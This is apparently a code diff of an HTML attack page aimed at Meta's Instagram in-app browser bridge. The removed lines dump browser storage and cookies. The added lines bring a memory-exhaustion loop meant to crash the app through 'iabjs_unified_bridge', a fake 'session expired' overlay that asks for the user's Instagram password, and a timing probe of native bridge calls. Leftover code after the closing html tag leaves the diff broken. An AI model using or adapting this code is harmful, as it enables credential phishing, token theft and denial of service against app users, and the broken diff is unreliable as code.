@@ -2,68 +2,67 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Memory Dumper</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 15px; }
-        .card { border: 1px solid #333; padding: 10px; margin-bottom: 15px; background: #111; }
-        button { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 12px; width: 100%; margin: 5px 0; font-weight: bold; }
-        .log { background: #000; height: 300px; overflow-y: scroll; border: 1px solid #444; padding: 10px; font-size: 11px; color: #00ffff; }
-        .found { color: #ffff00; font-weight: bold; }
+        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; text-align: center; }
+        .btn { background: #1a0000; color: #ff0000; border: 2px solid #ff0000; padding: 15px; width: 100%; margin: 10px 0; font-weight: bold; }
+        #status { color: #00ff00; font-size: 12px; margin-top: 20px; text-align: left; border: 1px solid #333; padding: 10px; height: 100px; overflow: scroll; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h3>Memory & Token Dumper</h3>
-        <button onclick="dumpAllStorage()">1. Dump All Storage (Tokens?)</button>
-        <button onclick="checkCookies()">2. Check Document Cookies</button>
-        <button onclick="fuzzBridgeEvents()">3. Listen for Bridge Leaks</button>
-    </div>
+    <h2>META CRASH & HIJACK TEST</h2>
 
-    <div id="log" class="log">Scanning for sensitive memory fragments...</div>
+    <button class="btn" onclick="crashTest()">1. EXECUTE APP CRASH (DoS)</button>
+    <button class="btn" onclick="fakeSystemDialog()">2. FAKE SYSTEM OVERLAY</button>
+    <button class="btn" onclick="checkBridgeLatency()">3. BRIDGE LATENCY SCAN</button>
+
+    <div id="status">Console: Awaiting command...</div>
 
     <script>
-        const logBox = document.getElementById('log');
-        function log(m, cls='') { 
-            logBox.innerHTML += `<div class="${cls}">> [${new Date().toLocaleTimeString()}] ${m}</div>`; 
-            logBox.scrollTop = logBox.scrollHeight;
-        }
+        function log(m) { document.getElementById('status').innerHTML += "<br>> " + m; }
 
-        // 1. Storage Dumping
-        function dumpAllStorage() {
-            log("Scanning Local & Session Storage...");
-            let found = 0;
-            [localStorage, sessionStorage].forEach((storage, idx) => {
-                let type = idx === 0 ? "Local" : "Session";
-                for (let i = 0; i < storage.length; i++) {
-                    let key = storage.key(i);
-                    let val = storage.getItem(key);
-                    log(`[${type}] FOUND: ${key} = ${val.substring(0, 30)}...`, "found");
-                    found++;
+        // 1. App Crash Test (Memory Exhaustion)
+        function crashTest() {
+            log("Launching Memory Exhaustion... App might freeze.");
+            var longStr = "PWNED";
+            // Infinite loop to stress the bridge string handler
+            while(true) {
+                longStr += longStr;
+                try {
+                    window.iabjs_unified_bridge.postMessage(longStr, "*");
+                } catch(e) {
+                    // Agar yahan error nahi aaya aur app freeze ho gayi, toh crash successful
                 }
-            });
-            if(found === 0) log("No keys found in storage.");
-        }
-
-        // 2. Cookie Check
-        function checkCookies() {
-            log("Reading document.cookie...");
-            const cookies = document.cookie;
-            if (cookies) {
-                log("COOKIES DETECTED: " + cookies, "found");
-            } else {
-                log("No non-HttpOnly cookies found.");
             }
         }
 
-        // 3. Force Bridge to emit something
-        function fuzzBridgeEvents() {
-            log("Pinging bridge for event leaks...");
-            // Triggering a fake event to see if the bridge responds with data
+        // 2. Fake Overlay (Phishing Potential)
+        function fakeSystemDialog() {
+            log("Injecting Fake Overlay...");
+            let div = document.createElement('div');
+            div.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999; color:white; padding:50px; text-align:center;";
+            div.innerHTML = `
+                <h2 style="color:red">System Security Alert</h2>
+                <p>Your Instagram Session has expired. Please re-enter password to continue.</p>
+                <input type="password" placeholder="Password" style="padding:10px; width:80%;"><br><br>
+                <button onclick="location.reload()" style="padding:10px 20px;">UPDATE SESSION</button>
+            `;
+            document.body.appendChild(div);
+        }
+
+        // 3. Timing Attack
+        function checkBridgeLatency() {
+            let start = performance.now();
             try {
-                window.dispatchEvent(new Event('DOMContentLoaded'));
-                window.dispatchEvent(new Event('load'));
-                
+                window.browserDeclutter.applyConfig({});
+                let end = performance.now();
+                log("Bridge Latency: " + (end - start).toFixed(4) + "ms");
+                log("If < 0.1ms, it's a direct native call (Vulnerable).");
+            } catch(e) { log("Bridge unresponsive."); }
+        }
+    </script>
+</body>
+</html>
                 // If the bridge is iabjs, try to trigger a callback
                 if (window.iabjs_unified_bridge) {
                     log("Attempting iabjs callback hijack...");
